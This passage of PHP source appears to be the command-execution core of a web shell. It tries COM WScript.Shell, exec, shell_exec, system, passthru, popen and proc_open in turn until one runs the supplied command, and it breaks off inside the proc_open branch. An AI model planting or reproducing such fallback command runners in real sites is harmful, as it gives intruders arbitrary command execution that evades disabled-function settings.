            case 'COM':
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && $com) {
                    try {
                        $output = [];
                        $obj = new COM("WScript.Shell");
                        $result = $obj->Exec($cmd);
                        while (!$result->Status) {
                            sleep(1);
                        }
                        $stdout = $result->StdOut;
                        while (!$stdout->AtEndOfStream) {
                            $line = trim($stdout->ReadLine());
                            if (!empty($line)) {
                                $output[] = $line;
                            }
                        }
                        return ['res' => implode("\n", $output), 'msg' => 'COM'];
                    } catch (Exception $e) {
                        continue;
                    }
                }
                break;
            case 'exec':
                exec($cmd . ' 2>&1', $output, $return_var);
                if ($return_var === 0) {
                    return ['res' => implode("\n", $output), 'msg' => 'exec'];
                }
                break;
            case 'shell_exec':
                $output = shell_exec($cmd);
                if ($output !== null) {
                    return ['res' => $output, 'msg' => 'shell_exec'];
                }
                break;
            case 'system':
                ob_start();
                $return_var = system($cmd . ' 2>&1');
                $output = ob_get_clean();
                if ($return_var === 0) {
                    return ['res' => $output, 'msg' => 'system'];
                }
                break;
            case 'passthru':
                ob_start();
                passthru($cmd . ' 2>&1');
                $output = ob_get_clean();
                if (!empty($output)) {
                    return ['res' => $output, 'msg' => 'passthru'];
                }
                break;
            case 'popen':
                $handle = popen($cmd . ' 2>&1', 'r');
                if ($handle) {
                    $output = stream_get_contents($handle);
                    pclose($handle);
                    if (!empty($output)) {
                        return ['res' => $output, 'msg' => 'popen'];
                    }
                }
                break;
            case 'proc_open':
                $descriptorspec = [
                    0 => ["pipe", "r"],
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"]
                ];
                $process = proc_open($cmd, $descriptorspec, $pipes, $cwd);
                if (is_resource($process)) {
                    fclose($pipes[0]);
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
